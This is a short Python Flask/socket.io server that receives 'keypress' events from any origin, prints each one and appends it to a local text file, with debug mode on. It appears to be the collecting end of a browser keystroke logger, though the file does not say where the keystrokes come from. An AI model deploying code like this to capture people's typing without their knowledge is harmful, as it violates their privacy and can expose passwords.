import eventlet
import socketio
from flask import Flask
import os


app = Flask(__name__)
app.debug = True  


sio = socketio.Server(cors_allowed_origins='*')
app = socketio.Middleware(sio, app)


script_dir = os.path.dirname(__file__)


file_name = 'keypress_data.txt'
file_path = os.path.join(script_dir, file_name)


if not os.path.exists(file_path):
    try:
        with open(file_path, 'w') as file:
            pass
        print(f"File '{file_path}' created.")
    except Exception as e:
        print(f"Error creating file: {str(e)}")


@sio.event
def keypress(sid, data):
    print(data)
    try:
        
        with open(file_path, 'a') as file:
            file.write(data + '\n')
        print(f"Data saved to '{file_path}' successfully.")
    except Exception as e:
        print(f"Error saving data to file: {str(e)}")

    
    sio.emit('response_event', {'message': 'Hello from the server!'}, room=sid)

if __name__ == '__main__':
    
    eventlet.wsgi.server(eventlet.listen(('127.0.0.1', 5000)), app)
